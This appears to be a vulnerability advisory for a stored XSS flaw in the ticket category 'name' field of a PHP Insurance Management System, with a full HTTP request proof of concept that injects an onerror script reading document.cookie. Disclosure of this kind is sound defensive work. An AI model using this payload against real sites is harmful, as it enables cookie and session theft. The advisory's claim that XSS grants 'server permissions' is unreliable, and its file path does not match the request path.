## Affected version: 
Insurance Management System - 1.0

## Vendor:
https://www.sourcecodester.com/users/munyweki

## Software:
https://www.sourcecodester.com/php/16995/insurance-management-system-php-mysql.html

## Vulnerability File:
/e-insurance/Script/admin/core/new_categor

## Description:
There is a stored XSS vulnerability in the name parameter of the added ticket class in the insurance management system. An attacker can use this vulnerability to gain server permissions.

Status: CRITICAL

POC
```
POST /e-insurance/Script/admin/core/new_category2 HTTP/1.1
Host: localhost
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:95.0) Gecko/20100101 Firefox/95.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 26
Origin: http://localhost
Connection: close
Referer: http://localhost/e-insurance/Script/admin/?page=ticket_categories
Cookie: PHPSESSID=cims89c5nt143re39d3ce6cdvd; __insuarance__logged=1; __insuarance__key=SK9MGL4R5CQPM34FZSH3
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1

name=123'"<img src=1 onerror=alert(document.cookie)>&status=1&submit=1
```

Get user cookie


<img width="1510" alt="image" src="https://github.com/user-attachments/assets/ac78198e-68e1-4e63-91e4-0b8ef7b03f24">



<img width="1709" alt="image" src="https://github.com/user-attachments/assets/edd1d7c9-fe69-4090-8a1e-dedc82cc786d">





 
